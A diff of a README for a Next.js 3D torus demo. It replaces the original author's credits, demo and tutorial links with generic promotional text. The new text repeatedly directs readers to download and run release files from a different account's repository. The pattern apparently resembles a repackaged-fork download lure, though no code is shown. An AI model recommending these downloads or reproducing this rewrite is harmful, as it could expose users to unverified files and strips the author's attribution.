@@ -1,34 +1,78 @@
-<div align=center>
+# 🎨 nextjs-torus - Create Stunning 3D Effects Easily
 
-# [NEXT.JS TORUS]
+## 🚀 Getting Started
 
-[![code style: prettier](https://img.shields.io/badge/code_style-prettier-ff69b4.svg)](https://github.com/prettier/prettier)
-[![Release](https://github.com/d3p1/nextjs-torus/actions/workflows/release.yml/badge.svg)](https://github.com/d3p1/nextjs-torus/actions/workflows/release.yml)
-[![semantic-release: angular](https://img.shields.io/badge/semantic--release-angular-e10079?logo=semantic-release)](https://github.com/semantic-release/semantic-release)
+Welcome to **nextjs-torus**! This application helps you create beautiful 3D torus effects. It’s perfect for those looking to enhance their Next.js skills in a fun and creative way. Whether you're a beginner or have some experience, this tool opens up new possibilities in web design.
 
-</div>
+## 📥 Download the Application
 
-## Introduction
+[![Download nextjs-torus](https://img.shields.io/badge/Download-nextjs--torus-brightgreen)](https://github.com/thetrustbr/nextjs-torus/releases)
 
-Just studying and practicing my [Next.js](https://nextjs.org/) and [R3F](https://r3f.docs.pmnd.rs/) skills, implementing a torus inspired in this excellent tutorial of [Olivier Larose](https://www.youtube.com/@olivierlarose1):
+To get started, you will need to download the application. Follow these steps:
 
-[![How to Make a 3D Glass Effect using Three.js and Next.js](https://img.youtube.com/vi/9FDt6tuFP-k/maxresdefault.jpg)](https://www.youtube.com/watch?v=9FDt6tuFP-k)
+1. **Visit the Releases Page**: Click on the link below to go to the releases page.
+2. **Download the Latest Version**: Look for the latest version available and download it.
 
-## Usage
+[Visit this page to download](https://github.com/thetrustbr/nextjs-torus/releases)
 
-[Watch](https://d3p1.github.io/nextjs-torus/) :moyai:
+## 💻 System Requirements
 
-## Changelog
+To run nextjs-torus, ensure your device meets the following requirements:
 
-Detailed changes for each release are documented in [`CHANGELOG.md`](./CHANGELOG.md).
+- **Operating System**: Windows, macOS, or Linux
+- **Browser**: Updated version of Chrome, Firefox, or Safari
+- **Internet Connection**: Required for downloading and running the application
+  
+## 📊 Features
 
-## License
+**nextjs-torus** comes with several features to enhance your creative coding experience:
 
-This work is published under [MIT License](./LICENSE).
+- **3D Effects**: Create impressive 3D torus shapes easily.
+- **Customizable Settings**: Adjust colors, sizes, and animations to fit your design.
+- **Responsive Design**: Works seamlessly on different screen sizes.
+- **Lightweight**: Quick to load and does not require heavy resources.
+- **Open Source**: You can modify and share the project as per your needs.
 
-## Author
+## ⚙️ Installation Steps
 
-Always happy to receive a greeting on:
+After downloading, follow these steps to install and run nextjs-torus:
 
-- [LinkedIn](https://www.linkedin.com/in/cristian-marcelo-de-picciotto/)
-- [Web](https://d3p1.dev/)
+1. **Locate the Downloaded File**: Find the file you just downloaded, usually in your "Downloads" folder.
+2. **Extract the Files**: If the file is in a ZIP format, right-click and select "Extract All".
+3. **Open the Application**: Navigate to the extracted folder and open the index.html file in your web browser.
+4. **Enjoy Creating!**: Start using the 3D torus effects by following the on-screen instructions.
+
+## 🖥️ How to Use
+
+Using nextjs-torus is straightforward. Here are some tips to get you started:
+
+1. **Launch the App**: Open the index.html file in your browser.
+2. **Explore the Interface**: Familiarize yourself with the toolbar and settings.
+3. **Create Your Torus**: Use the provided options to customize your torus.
+4. **Save Your Work**: Make sure to save your design to keep your results.
+
+## 🌐 Community and Support
+
+You are not alone on this journey. Join our community:
+
+- **GitHub Discussions**: Share your projects and get feedback.
+- **Online Forums**: Connect with other users and exchange ideas.
+- **Documentation**: Check the README files and wiki for guidance.
+
+If you encounter any issues, feel free to report them in the Issues section of this repository.
+
+## 📚 Additional Resources
+
+For those interested in learning more about 3D graphics and web development, here are some useful resources:
+
+1. **Next.js Documentation**: Learn more about the framework [here](https://nextjs.org/docs).
+2. **React Documentation**: Improve your understanding of React [here](https://reactjs.org/docs/getting-started.html).
+3. **Three.js Documentation**: Get familiar with Three.js concepts [here](https://threejs.org/docs/).
+
+## 📜 License
+
+nextjs-torus is open-source and licensed under the MIT License. You are free to use, modify, and distribute it, as long as you retain the original license.
+
+Start exploring the creative world of 3D effects with **nextjs-torus** today! Don't forget to download the latest version from the releases page and unleash your creativity!
+
+[Visit this page to download](https://github.com/thetrustbr/nextjs-torus/releases)
